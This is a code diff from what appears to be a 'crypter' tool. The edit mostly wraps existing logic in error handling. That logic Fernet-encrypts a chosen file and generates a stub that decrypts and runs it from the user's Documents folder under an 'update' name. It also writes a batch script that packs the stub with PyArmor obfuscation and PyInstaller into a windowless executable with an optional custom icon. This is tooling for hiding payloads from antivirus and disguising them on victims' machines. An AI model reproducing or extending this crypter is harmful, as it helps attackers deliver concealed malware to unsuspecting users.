@@ -60,17 +60,17 @@ $dependencies\n\tinstall all dependencies
         icon = str(input(style.CYAN))
         input(style.YELLOW+"[i]press enter to start")
         print(style.GREY)
+        try:
+            key = Fernet.generate_key()
+            f = Fernet(key)
+            with open(file_crypt, 'rb') as file:
+                file_data = file.read()
+            encrypted_data = f.encrypt(file_data) 
+            new_name = f.encrypt(file_crypt_name.encode())
+            with open(f"enc_{file_crypt_name}", 'wb') as file:
+                file.write(encrypted_data)
 
-        key = Fernet.generate_key()
-        f = Fernet(key)
-        with open(file_crypt, 'rb') as file:
-            file_data = file.read()
-        encrypted_data = f.encrypt(file_data) 
-        new_name = f.encrypt(file_crypt_name.encode())
-        with open(f"enc_{file_crypt_name}", 'wb') as file:
-            file.write(encrypted_data)
-
-        code = fr'''
+            code = fr'''
 from cryptography.fernet import Fernet
 import os, sys
 import subprocess
@@ -99,7 +99,7 @@ subprocess.call(r"C:\Users\\" + os.environ.get('USERNAME') + r"\Documents\update
 os._exit(0)
 '''
         
-        batCode = fr'''
+            batCode = fr'''
 @echo off  
 chcp 65001  
 color 2  
@@ -112,12 +112,12 @@ echo Progress: [10%%]
 cd dist  
 echo Progress: [40%%]
 '''
-        if icon == "none":
-             batCode += fr'''pyinstaller -F -w --noconsole --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py"'''
-        else:
-            batCode += fr'''pyinstaller -F -w --noconsole -i "{icon}" --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py"'''
+            if icon == "none":
+                batCode += fr'''pyinstaller -F -w --noconsole --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py"'''
+            else:
+                batCode += fr'''pyinstaller -F -w --noconsole -i "{icon}" --add-data "pyarmor_runtime_000000;pyarmor_runtime_000000/" --add-data "../enc_{file_crypt_name};." --hidden-import "Fernet" --hidden-import "cryptography" --hidden-import "cryptography.fernet" "{name}.py"'''
 
-        batCode += fr'''  
+            batCode += fr'''  
 cd dist  
 echo Progress: [80%%]
 mkdir ..\..\build\  
@@ -131,12 +131,16 @@ del /s /q "{name}.bat"
 echo "Progress: [100%%]"
 echo "The scripted build file is located in the build/ folder"
 pause'''
-        with open(f"{name}.py", 'w', encoding='utf-8') as f:
-            f.write(code)
-        with open(f"{name}.bat", 'w', encoding='utf-8') as f:
-            f.write(batCode)
-        os.startfile(f"{name}.bat")
-        input(style.GREEN+"[i]if crypting end...press enter")
+            with open(f"{name}.py", 'w', encoding='utf-8') as f:
+                f.write(code)
+            with open(f"{name}.bat", 'w', encoding='utf-8') as f:
+                f.write(batCode)
+            os.startfile(f"{name}.bat")
+            input(style.GREEN+"[i]if crypting end...press enter")
+            os.system("cls")
+        except Exception as error:
+            print(error)
+            input(style.GREEN+"[i]Fatal_Error...press enter")
         os.system("cls")
         VineShield()
 
